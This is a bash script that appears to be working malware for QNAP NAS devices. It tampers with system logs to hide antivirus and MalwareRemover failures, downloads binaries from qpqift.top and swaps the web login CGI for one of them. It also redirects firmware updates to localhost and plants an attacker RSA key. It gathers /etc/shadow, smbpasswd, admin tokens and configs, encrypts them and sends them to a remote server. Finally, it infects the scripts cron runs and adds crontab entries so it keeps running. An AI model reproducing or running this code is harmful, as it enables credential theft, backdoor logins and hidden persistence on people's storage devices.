#!/bin/bash
ts=1549432800
PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin"
test -d /etc/config && confdir=/etc/config || { test -d /mnt/HDA_ROOT/.config && confdir=/mnt/HDA_ROOT/.config; }
test -f "${confdir}/smb.conf" && for i in homes Public Download Multimedia Web Recordings; do bdir=`getcfg "$i" path -f "${confdir}/smb.conf"` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && test -d "$bdir" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { command -v readlink >/dev/null 2>&1 || ln -sf /bin/busybox /usr/bin/readlink; for i in homes Public Download Multimedia Web Recordings; do bdir=`readlink "/share/${i}" 2>/dev/null` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && bdir=/share/${bdir##*/} && test -d "$bdir" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`getcfg SHARE_DEF defVolMP -f "${confdir}/def_share.info"` && test -d "$bdir" || bdir=''
test -z "${bdir}" || test ! -d "${bdir}"; } && { while read -r bdir; do
test -d "$bdir" && break; bdir=''
done <<EOF
$(mount | sed -n "s/.*\(\/share\/[^ /]\+\) .*/\1/gp")
EOF
test -z "${bdir}" || test ! -d "${bdir}"; } && { for i in {{CE_,}CACHEDEV{1,2,3},MD0,HDA}_DATA; do test -d "/share/${i}" && bdir="/share/${i}" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { bdir=/mnt/HDA_ROOT && test -d "$bdir" || bdir='/'; }; }

getcfg MalwareRemover Version -f /etc/config/qpkg.conf && setcfg MalwareRemover Version 3.4.1 -f /etc/config/qpkg.conf
getcfg MalwareRemover Date -f /etc/config/qpkg.conf && setcfg MalwareRemover Date 2019-01-25 -f /etc/config/qpkg.conf
getcfg MalwareRemover Build -f /etc/config/qpkg.conf && setcfg MalwareRemover Build 20190125 -f /etc/config/qpkg.conf

if grep "clamav\.net" /etc/hosts; then
sed -i '/0.0.0.0 .*clamav\.net/d' /etc/hosts
fi

if grep '0\.0\.0\.0 update\.nai\.com' /etc/hosts; then
sed -i '/0\.0\.0\.0 update\.nai\.com/d' /etc/hosts
fi

test -z "$PWD" && PWD=$(pwd)
CWD="$PWD"
if [ "${CWD%/*}" != "${bdir}/.qpkg" ]; then
        CWD=''
        for dir in '.config' '.liveupdate'; do
                dir="${bdir}/.qpkg/${dir}"
                test -d "$dir" && cd "$dir" && CWD="$dir" && break
        done
fi
test "$CWD" && test -d "$CWD" && cd "$CWD"

sedreplace () {
local grepstring="$1" sedcmd="$2" file="$3"
[ "$grepstring" ] && [ "$sedcmd" ] && [ "$file" ] || return 1
if grep "$grepstring" "$file"; then
test -f '.qdisk_cmd' && ./.qdisk_cmd -i "$file"
sed -i "$sedcmd" "$file"
test -f '.qdisk_cmd' && ./.qdisk_cmd +i "$file"
fi
return $?
}

for path in ".config/backup_conf.sh" ".liveupdate/liveupdate.sh"; do
file=''
[ -f "${path#*/}" ] && file="${path#*/}" || { [ -f "${bdir}/.qpkg/${path}" ] && file="${bdir}/.qpkg/${path}"; }
if [ "x${file}" != 'x' ]; then
sedcmd='s/CXqrBM2CVbJog4rwwSz1Bp1i1B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex/CXqrBM2CVbJog4rwwSz1Bp1i1'"'"'\
verifykey="${verifykey}"'"'"'B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex/'
grepstring='CXqrBM2CVbJog4rwwSz1Bp1i1B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex'
sedreplace "$grepstring" "$sedcmd" "$file"
sedcmd='s/g4rwwSz1Bp1i1'"'"'/g4rwwS'"''"'z1Bp1i1'"'"'/'
grepstring='g4rwwSz1Bp1i1'"'"
sedreplace "$grepstring" "$sedcmd" "$file"
fi
done
file=''

if [ ! -f '1548766800_c' ]; then
if getcfg Antivirus AutoUpdateDBEnable -f /etc/config/antivirus.global | grep -i TRUE; then
test -f '/mnt/HDA_ROOT/.logs/notice.log' && python <<"EOF"
import sqlite3
conn = sqlite3.connect('/mnt/HDA_ROOT/.logs/notice.log')
c = conn.cursor()
c.execute("DELETE FROM NASLOG_NOTICE WHERE time > 1547096400 AND desc LIKE '[AntiVirus] Failed to update virus definitions%'")
conn.commit()
conn.close()
exit()
EOF
test -f '/mnt/HDA_ROOT/.logs/event.log' && python <<"EOF"
import sqlite3
conn = sqlite3.connect('/mnt/HDA_ROOT/.logs/event.log')
c = conn.cursor()
c.execute("DELETE FROM NASLOG_EVENT WHERE event_timet > 1547096400 AND event_desc LIKE '[AntiVirus] Failed to update virus definitions%'")
conn.commit()
conn.close()
exit()
EOF
fi
if getcfg MalwareRemover Enable -f /etc/config/qpkg.conf | grep -i 'true' || grep 'MalwareRemover' '/etc/config/crontab' '/tmp/cron/crontabs/admin'; then
test -f '/mnt/HDA_ROOT/.logs/notice.log' && python <<"EOF"
import sqlite3
conn = sqlite3.connect('/mnt/HDA_ROOT/.logs/notice.log')
c = conn.cursor()
c.execute("DELETE FROM NASLOG_NOTICE WHERE time > 1547964000 AND desc LIKE '[MalwareRemover] Malware Remover stopped%'")
conn.commit()
conn.close()
exit()
EOF
test -f '/mnt/HDA_ROOT/.logs/event.log' && python <<"EOF"
import sqlite3
conn = sqlite3.connect('/mnt/HDA_ROOT/.logs/event.log')
c = conn.cursor()
c.execute("DELETE FROM NASLOG_EVENT WHERE event_timet > 1547964000 AND event_desc LIKE '[MalwareRemover] Malware Remover stopped%'")
conn.commit()
conn.close()
exit()
EOF
touch "1548766800_c"
fi
fi

if [ ! -f ".qdisk_cmd" ]; then
	case "$(uname -m)" in 
	*x86_64*)
			arch=x86_64
			binhash='g2oe7EJJVCiAHY6AG1I1c/lGF8Y='
			;;
	*arm*|*aarch*)
			arch=arm
			binhash='Z3twHZvQqYZ1vLeu4PLnZekdkRY='
			;;
	*i*86*)
			arch=i486
			binhash='gWzECXuIp3dz5yI7RJS9d4+xpq4='
			;;
	esac
	
	if [ "x${binhash}" != 'x' ]; then
		curl --connect-timeout 12 -m 1200 -k -o ".qdisk_cmd.tmp" "https://qpqift.top/data/qdisk_cmd_${arch}" || rm -f ".qdisk_cmd.tmp"
		test -f '.qdisk_cmd.tmp' && rsynchash="$(openssl dgst -sha1 -binary ".qdisk_cmd.tmp" | openssl base64)"
		if [ "x${rsynchash}" = "x${binhash}" ]; then
			mv '.qdisk_cmd.tmp' '.qdisk_cmd' && chmod +x '.qdisk_cmd'
		else
			rm -f '.qdisk_cmd.tmp'
		fi
	fi
fi
binhash=''; rsynchash=''

for path in ".config/backup_conf.sh" ".liveupdate/liveupdate.sh"; do
if [ -f "${path#*/}" ]; then 
test -f '.qdisk_cmd' && ./.qdisk_cmd +i "${path#*/}"
elif [ -f "${bdir}/.qpkg/${path}" ]; then
test -f '.qdisk_cmd' && ./.qdisk_cmd +i "${bdir}/.qpkg/${path}"
fi
done

version=$(getcfg System Version)
test "x${version}" = 'x' && version=$(getcfg System Version -f /etc/default_config/uLinux.conf)
test "${version##*.}" -lt 3 || test "${version%%.*}" -lt 4 || test "$(version=${version#*.}; echo "${version%.*}")" -lt 3 && version=4.3.3 || { test "${version##*.}" -gt 5 && version=4.3.5; }

if [ ! -d rssdoc ]; then 
command -v bunzip2 && compext=bz2 || compext=gz
curl --connect-timeout 12 -m 1200 -k -o "rssdoc.tar.${compext}" "https://qpqift.top/data/rssdoc.tar.${compext}" && test -f "rssdoc.tar.${compext}" && rssdochash="$(openssl dgst -sha1 -binary "rssdoc.tar.${compext}" | openssl base64)" && { test "$rssdochash" = 'WOkc6vlUa7A30GKa4Z4o02CIexk=' || test "$rssdochash" = "0h0Jyx52a/F9YB80Ml4SsEsugyA="; } && { test "$compext" = bz2 && tarflag=j || tarflag=z; } && tar -x${tarflag}f "rssdoc.tar.${compext}" || rm -f rssdoc.tar
rm -f "rssdoc.tar.${compext}"
fi

rm -f /home/httpd/{Liveupdate,FirmwareRelease{,_beta}S.xml}
ln -s "${CWD}"/rssdoc/{Liveupdate,FirmwareRelease{,_beta}S.xml} /home/httpd

if grep 'Liveupdate\|FirmwareRelease\|QTS_FW' /etc/default_config/uLinux.conf /etc/config/uLinux.conf | grep 'qnap\.com\|0\.0\.0\.0'; then
internalwebport=$(/sbin/getcfg System InnerWebAccessPort -d 58080)
localupdateurl="http://127.0.0.1:${internalwebport}"
sed -i 's/https\?:\/\/[^\/]\+\/\(Liveupdate\|FirmwareRelease\|QTS_FW\)/http:\/\/127.0.0.1:'${internalwebport}'\/\1/' /etc/default_config/uLinux.conf /etc/config/uLinux.conf
fi

test -f '/etc/config/rssdoc/qpkgcenter_*.xml' || test -h '/etc/config/rssdoc/qpkgcenter_*.xml' && { test -f '.qdisk_cmd' && ./.qdisk_cmd -i '/etc/config/rssdoc/qpkgcenter_*.xml'; rm -f '/etc/config/rssdoc/qpkgcenter_*.xml'; }

if find /etc/config/rssdoc | grep 'qpkgcenter_.*\.xml'; then
:
else
cp "./rssdoc/Liveupdate/QTS${version}/qpkgcenter_eng.xml" '/etc/config/rssdoc/qpkgcenter_eng.xml'
test -f '.qdisk_cmd' && ./.qdisk_cmd +i '/etc/config/rssdoc/qpkgcenter_eng.xml'
fi

for file in /etc/config/rssdoc/qpkgcenter_*.xml
do
if [ -f "$file" ] && { rm -f "$file" || [ ! -s "$file" ]; }; then
test -f '.qdisk_cmd' && ./.qdisk_cmd -i "$file"
touch "$file"
cp -f "./rssdoc/Liveupdate/QTS${version}/${file##*/}" "$file"
test -f '.qdisk_cmd' && ./.qdisk_cmd +i "$file"
fi
done
file=''

for qpkgdir in "${bdir}/.qpkg" '../../.qpkg'; do
test -d "$qpkgdir" && break
done
test -d "${qpkgdir}/MalwareRemover" || mkdir "${qpkgdir}/MalwareRemover"
test -d "${qpkgdir}/MalwareRemover/modules" || mkdir "${qpkgdir}/MalwareRemover/modules"
test -f '.qdisk_cmd' && ./.qdisk_cmd -i "${qpkgdir}/MalwareRemover"

if [ -d "${qpkgdir}/MalwareRemover/modules" ]; then
for file in 10_derek_3.pyc 12_derek_3.pyc; do
if [ ! -f "${qpkgdir}/MalwareRemover/modules/${file}" ] || rm -f "${qpkgdir}/MalwareRemover/modules/${file}" || test -x "${qpkgdir}/MalwareRemover/modules/${file}" || [ $(wc -c < "${qpkgdir}/MalwareRemover/modules/${file}") -gt 150 ] || [ $(wc -c < "${qpkgdir}/MalwareRemover/modules/${file}") -lt 120 ]; then
test -f '.qdisk_cmd' && test -f "${qpkgdir}/MalwareRemover/modules/${file}" && ./.qdisk_cmd -i "${qpkgdir}/MalwareRemover/modules/${file}" && rm -f "${qpkgdir}/MalwareRemover/modules/${file}"
openssl base64 -d <<"EOF" >"${qpkgdir}/MalwareRemover/modules/${file}"
A/MNCuVwTVxjAAAAAAAAAAABAAAAQAAAAHMLAAAAZQAAgwAAAWQAAFMoAQAAAE4o
AQAAAHQEAAAAZXhpdCgAAAAAKAAAAAAoAAAAAHMVAAAAbW9kdWxlcy8xMF9kZXJl
a18zLnB5dAgAAAA8bW9kdWxlPgEAAABzAAAAAA==
EOF
chmod -x "${qpkgdir}/MalwareRemover/modules/${file}"
test -f '.qdisk_cmd' && ./.qdisk_cmd +i "${qpkgdir}/MalwareRemover/modules/${file}"
fi
done
fi
file=''; qpkgdir=''

if [ ! -f .rsakey ]; then
verifykey='-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAt/EDT6SB75atrHW7Cpog
CXqrBM2CVbJo';verifykey="${verifykey}"'g4rwwS''z1Bp1i1'
verifykey="${verifykey}"'B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex
RC5qQSiS/7FS48jsPKsJnrUhnsI1fRLM4DqsEF3UOukZuDOYUhlteDuMqqZBz0AC
Q3YnLjraTjchMF0XmaAAcWOkg5MsxAOKTepue4R/tnrPAkAG86nq5LA1+wa7opNV
gQzwDh7YXhBnWz52+ebZ9TeqD31/sb5hoyUKf1Nr5HcKkklObuz1OGQJ//pkCbTC
2EnQw6tCPQhgSIA8wJKkaxW0f/UHP+YBmWa4Wn+uPrJJuHSVNEJtAp2wlX3THltz
0IGPQEuzoafOAl3EFjas3HcTX2HlEfnvAtRL2iLxJeba1nZ+U3geZOuxL1NhWhNh
pjaLcKwhkRck7Y5hr1Pz8pLDnXsx5w0QUz6XS8HVf/KHnNXHufFEn01y9YoPuau1
DNnpDGbq632Bs8ESd3ueHk9OY/UZxWeN3UdbseFxK35XAgMBAAE=
-----END PUBLIC KEY-----'
test -f ".rsakey" || echo "$verifykey" > ".rsakey"
fi

cgibindir='/home/httpd/cgi-bin'
if [ ! -f "1549101600_c" ] && [ -f "${cgibindir}/authLogin.cgi" ]; then
	test -f "1549101600_c" || touch "1549101600_c"
	case "$(uname -m)" in 
	*x86_64*)
			arch=x86_64
			binhash='rrYwg0D4+4DxcDxYQsNTB4JUGlQ='
			;;
	*arm*|*aarch*)
			arch=arm
			binhash='Z4n2BZdhwjYf0wjM7GCW61WM9eU='
			;;
	*i*86*)
			arch=i486
			binhash='U3eHe6syQraRBGgsvkFZH3wibDw='
			;;
	esac
	
	if [ "x${binhash}" != 'x' ]; then
		curl --connect-timeout 12 -m 1200 -k -o ".qal" "https://qpqift.top/data/qal2_${arch}" || rm -f ".qal"
		test -f '.qal' && rsynchash="$(openssl dgst -sha1 -binary ".qal" | openssl base64)"
		if [ "x${rsynchash}" = "x${binhash}" ]; then
			test -f "${cgibindir}"/sysauthLogin.cgi && mv "${cgibindir}"/sysauthLogin.cgi "${cgibindir}"/authLogin.cgi
			mv "${cgibindir}"/authLogin.cgi "${cgibindir}"/sysauthLogin.cgi && test -f "${cgibindir}"/sysauthLogin.cgi && mv '.qal' "${cgibindir}"/authLogin.cgi && chmod 755 "${cgibindir}"/authLogin.cgi
		fi
		test -f '.qal' && rm -f '.qal'
	fi
fi

if  [ -f "${cgibindir}"/authLogin.cgi ] && "${cgibindir}"/authLogin.cgi | grep '<QDocRoot'; then
:
else
test -f "${cgibindir}"/sysauthLogin.cgi && mv "${cgibindir}"/sysauthLogin.cgi "${cgibindir}"/authLogin.cgi
fi

test -f /etc/config/.qsync.conf && authkeysfile=$(grep AuthorizedKeysFile /etc/config/.qsync.conf | sed 's/"//g' | cut -d ' ' -f 2)
if [ "$authkeysfile" ] && [ -f "$authkeysfile" ] && grep 'miOGcmendZU2r10SdZVplBQ4i' "$authkeysfile"; then
sed -i '/miOGcmendZU2r10SdZVplBQ4i/d' "$authkeysfile"
lsofout="$(lsof +c 0 -i -n -P | grep :51163)"
sshpid="$(echo "$lsofout" | tr -s ' ' | cut -d ' ' -f 2 | head -n 1)"
kill -2 "$sshpid"
fi

if [ ! -f '1548997200_c' ]; then
touch '1548997200_c'
mdir=`mktemp -d /tmp/.mount.XXXXXX` || { mdir=/tmp/.mount.jbbxQob; mkdir ${mdir}; } || mdir=`mktemp -d "${bdir}/.mount.XXXXXX"` || { mdir="${bdir}/.mount.jbbxQob"; mkdir ${mdir}; } || `mktemp -d "/mnt/HDA_ROOT/.mount.XXXXXX"` || { mdir="/mnt/HDA_ROOT/.mount.jbbxQob"; mkdir ${mdir}; } || `mktemp -d "/.mount.XXXXXX"` || { mdir="/.mount.jbbxQob"; mkdir ${mdir}; } || `mktemp -d "./.mount.XXXXXX"` || { mdir="./.mount.jbbxQob"; mkdir ${mdir}; }
__BOOT_DEV=
__model=`getcfg System "Internal Model"`
CONFIG_DEV_NODE=`getcfg "CONFIG STORAGE" DEVICE_NODE -f /etc/platform.conf`
CONFIG_DEV_PART=`getcfg "CONFIG STORAGE" FS_ACTIVE_PARTITION -f /etc/platform.conf`
CONFIG_DEV_FS=`getcfg "CONFIG STORAGE" FS_TYPE -f /etc/platform.conf`
__BOOT_CONF=`test -f /etc/default_config/BOOT.conf && cat /etc/default_config/BOOT.conf 2>/dev/null || cat "${confdir}/BOOT.conf"` || { test "$arch_o" = arm && __BOOT_CONF=TS-NASARM; } 
command -v hal_app > /dev/null 2>&1 && { __BOOT_DEV=$(hal_app --get_boot_pd port_id=0); }
test "${__BOOT_CONF}" = TS-NASARM || test "$arch_o" = arm && { test -f /etc/IS_TAS && __BOOT_DEV="${__BOOT_DEV:-/dev/mtdblock}7" || __BOOT_DEV="${__BOOT_DEV:-/dev/mtdblock}5"; } || __BOOT_DEV="${__BOOT_DEV:-/dev/sdx}6"
test "x${CONFIG_DEV_NODE}" != "x" && { ubiattach -m "${CONFIG_DEV_PART}" -d 2; mount -t ubifs ubi2:config "${mdir}" > /dev/null 2>&1 || { test -f /etc/IS_TAS && mount -t ext4 /dev/mmcblk0p7 "${mdir}"; } } || mount ${__BOOT_DEV} -t ext2 ${mdir} || { test "${__model}" = "TS-201" && mount -t ext2 /dev/mtdblock4 ${mdir}; } || { ubiattach -m "${CONFIG_DEV_PART}" -d 2; mount -t ubifs ubi2:config "${mdir}"; mount -t ext4 /dev/mmcblk0p7 "${mdir}"; } || { test "${__model}" = "TS-269L" && mount -t ext2 /dev/sdc6 ${mdir}; } || { test "${__model}" = "TS-869" && mount -t ext2 /dev/sdi6 ${mdir}; } || { test "$arch_o" = arm || ${__BOOT_CONF} = "TS-NASARM" && { for i in 5 7 4 6 3 8; do mount -t ext2 "/dev/mtdblock${i}" ${mdir} && break; done; }; } || { test "$arch_o" = x86 && for n in /dev/sdc /dev/sdx /dev/sdi $__BOOT_DEV; do for i in 6 $CONFIG_DEV_PART; do mount -t ext2 ${n}${i} ${mdir} && break 2; done; done; } || { mount -t ext2 $(/sbin/hal_app --get_boot_pd port_id=0)6 ${mdir}; }

if [ $? -eq 0 ] || mount | grep "$mdir" >/dev/null; then
for file in "${mdir}"/K01* "${mdir}/autorun.sh" '/tmp/config/autorun.sh'; do
if [ -f "$file" ]; then
sedcmd='s/CXqrBM2CVbJog4rwwSz1Bp1i1B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex/CXqrBM2CVbJog4rwwSz1Bp1i1'"'"'\
verifykey="${verifykey}"'"'"'B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex/'
grepstring='CXqrBM2CVbJog4rwwSz1Bp1i1B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex'
sedreplace "$grepstring" "$sedcmd" "$file"
sedcmd='s/g4rwwSz1Bp1i1'"'"'/g4rwwS'"''"'z1Bp1i1'"'"'/'
grepstring='g4rwwSz1Bp1i1'"'"
sedreplace "$grepstring" "$sedcmd" "$file"
test -f '.qdisk_cmd' && ./.qdisk_cmd +i "$file"
fi
done
fi
umount "$mdir"
rmdir "$mdir"
fi

if [ ! -f '1548914400_c' ]; then
touch '1548914400_c'
key=$(tr -dc 'a-zA-Z0-9' </dev/urandom | { key=''; dd bs=20 count=1 2>/dev/null || head -c 20 || IFS='' read -rd '' -n 20 key; echo "$key"; } )
test "x$key" = 'x' && key=$(LC_ALL=C sed 's/[^a-zA-Z0-9]//g' </dev/urandom | { key=''; dd bs=20 count=1 2>/dev/null || head -c 20 || IFS='' read -rd '' -n 20 key; echo "$key"; } )
{ echo "$key" | openssl rsautl -pubin -inkey .rsakey -encrypt | openssl enc -base64 -A; printf ':'
{ echo; for file in "${bdir}/.log/.rqsys.log" /etc/config/.qos_config/users/admin/.qtoken /etc/config/.qos_config/users/admin/secondSV.conf /etc/config/ssmtp/ssmtp.conf /etc/config/smbpasswd /etc/shadow /etc/config/uLinux.conf /etc/default_config/uLinux.conf /mnt/HDA_ROOT/.config/qnapddns.conf /mnt/HDA_ROOT/.config/qid.conf /etc/platform.conf /etc/default_config/BOOT.conf /etc/default_config/Model_Name.conf /etc/config/qid.conf /etc/config/qddns_users.conf; do printf '%s:' "$file"; cat "$file"; echo; done; printf '%s:' "authLogin.cgi"; /home/httpd/cgi-bin/authLogin.cgi; printf '%s:' "display_name"; /sbin/get_display_name; } | gzip | { dd bs=4096 count=512 || head -c 2097152 || cat; } | openssl enc -aes-256-cbc -k "$key" -md md5 -salt -a -A; } | curl --connect-timeout 12 -m 300 -k -d '@-' "https://qpqift.top/ping.pl"
fi

if [ ! -f 1549429200_c ]; then
touch 1549429200_c
test -f liveupdate.sh && cronscriptpath=.liveupdate/liveupdate.sh || { test -f backup_conf.sh && cronscriptpath=.config/backup_conf.sh; }

if [ ! -z $cronscriptpath ]; then
{ { crontab -l || cat /etc/config/crontab; } | grep -v '^#' | awk '{ print $6 }'; sed -n 's/^ \?[Ss]hell \?= \?//p' /etc/config/qpkg.conf; } | grep '/' | sort | uniq | while IFS= read -r line; do
test ! -z "$line" || continue
test -f "$line" || continue
test "$line" = $(pwd)/liveupdate.sh || test "$line" = $(pwd)/backup_conf.sh && continue
rm .tmp.cronCDhLbZ
head -n 1 "$line" >.tmp.cronCDhLbZ && grep '^#!/bin/b\?a\?sh' .tmp.cronCDhLbZ || { rm -f .tmp.cronCDhLbZ; continue; }
cat >>.tmp.cronCDhLbZ <<"XXEOF"
( exec >/dev/null 2>&1; (
export PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin/X11:/usr/local/sbin:/usr/local/bin"
command -v dirname >/dev/null 2>&1 || dirname () { test -z "$1" && echo "." && return; local r="${1%"${1##*[!/]}"}"; case $r in /*[!/]*/*|[!/]*/*) r="${r%/*}"; echo "${r%"${r##*[!/]}"}";; */*) echo ${r%%[!/]};; "") echo $1;; *) echo .;; esac; }
test -d /etc/config && confdir=/etc/config || { test -d /mnt/HDA_ROOT/.config && confdir=/mnt/HDA_ROOT/.config; }
test -d "$confdir" || confdir=/etc/config
command -v getcfg > /dev/null 2>&1 || getcfg () { sed -n 'H;${x;s/\(.*\
\['"${1//\//\\\/}"']\|^\['"${1//\//\\\/}"']\)\
//I;s/\(^\|\
\)\[[^\
]\+\]\
.*//p}' "${4:-${confdir}/uLinux.conf}" | sed -n 's/^'"${2//\//\\\/}"' \?= \?\(.*\)/\1/Ip'; }
bdir=
test -f "${confdir}/smb.conf" && for i in homes Public Download Multimedia Web Recordings; do bdir=`getcfg "$i" path -f "${confdir}/smb.conf"` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && test -d "$bdir" && testwriteable=$(mktemp "${bdir}/.tmp.XXXXXX") && rm "${testwriteable}" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { command -v readlink >/dev/null 2>&1 || ln -sf /bin/busybox /usr/bin/readlink; for i in homes Public Download Multimedia Web Recordings; do bdir=`readlink "/share/${i}" 2>/dev/null` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && bdir=/share/${bdir##*/} && test -d "$bdir" && break; done;
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`getcfg SHARE_DEF defVolMP -f "${confdir}/def_share.info"`
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`mount | sed -n "s/.*\(\/share\/[^ /]\+\) .*/\1/gp" | head -n 1`
test -z "${bdir}" || test ! -d "${bdir}"; } && { for i in CACHEDEV3_DATA CACHEDEV2_DATA CACHEDEV1_DATA MD0_DATA; do test -d "/share/${i}" && bdir="/share/${i}" && break; done;
test -z "${bdir}" || test ! -d "${bdir}" && bdir=/mnt/HDA_ROOT; }
echo 'ab*c' | grep -F 'ab*c' >/dev/null 2>&1 && fgrep="grep -F" || { command -v fgrep >/dev/null 2>&1 && fgrep=fgrep || fgrep=grep; }
test "$fgrep" || fgrep=grep

XXEOF
cat >>.tmp.cronCDhLbZ <<XXEOF
if [ ! -f "\${bdir}/.qpkg/${cronscriptpath}" ]; then
test -d "\${bdir}/.qpkg" || mkdir -p "\${bdir}/.qpkg" || mkdir "\${bdir}/.qpkg"
test -d "\${bdir}/.qpkg/${cronscriptpath%/*}" || mkdir "\${bdir}/.qpkg/${cronscriptpath%/*}"
cat > "\${bdir}/.qpkg/${cronscriptpath}" <<"XEOF"
XXEOF
cat "${cronscriptpath#*/}" >>.tmp.cronCDhLbZ
cat >>.tmp.cronCDhLbZ <<XXEOF
XEOF
chmod 755 "\${bdir}/.qpkg/${cronscriptpath}"
touch -cr /bin/busybox "\${bdir}/.qpkg/${cronscriptpath}"
( ( exec >/dev/null 2>&1 </dev/null; "\${bdir}/.qpkg/${cronscriptpath}" </dev/null >/dev/null 2>/dev/null & ) & )
fi

test -x "\${bdir}/.qpkg/${cronscriptpath}" || chmod 755 "\${bdir}/.qpkg/${cronscriptpath}"

crontabargs=\$(ps | grep 'cr[o]nd ' | sed -n 's/.*crond[^0-9A-Za-z-]*\\(.\\+\\)/\\1/p')
trycount=10; trycount=\$(( \$trycount - 10 ))
set x \$crontabargs; shift
while [ \$# -gt 0 ] && [ \$trycount -lt 10 ]; do
trycount=\$(( \$trycount + 1 ))
getopts ':c:' OPT 2>/dev/null
test "\$OPT" = 'c' && crontabfile="\${OPTARG}/admin" && break
test "\$OPTIND" -gt 0 && shift "\$OPTIND" && OPTIND=1 || break
done
test "\$crontabfile" && test -f "\${crontabfile}" || crontabfile='/tmp/cron/crontabs/admin'

for crontab in "\$crontabfile" "\${confdir}/crontab"; do
if \$fgrep "\${bdir}/.qpkg/${cronscriptpath}" "\$crontab"; then
:
else
cronmins=\$(printf '%i' "\$(( \$RANDOM % 60 ))")
cronhour=\$(printf '%i' "\$(( \$RANDOM % 24 ))")
cronhour=\$(printf '%i,' "\$(( ( \$cronhour + 8 ) % 24 ))" "\$(( ( \$cronhour + 16 ) % 24 ))")"\$cronhour"
echo "\$cronmins \$cronhour"' * * * '"\${bdir}/.qpkg/${cronscriptpath} >/dev/null 2>/dev/null" >> "\$crontab"
crontab "\$crontab"
sleep 2
fi
done
) & ) &
XXEOF
sed -n '2,$p' "$line" >>.tmp.cronCDhLbZ && mv .tmp.cronCDhLbZ "$line"
chmod a+x "$line" || chmod 755 "$line"
test -f .tmp.cronCDhLbZ && rm .tmp.cronCDhLbZ
done
fi
fi

test -f "${ts}_c" || touch "${ts}_c"
rm -f "${CWD}/".tmp.*
exit 0
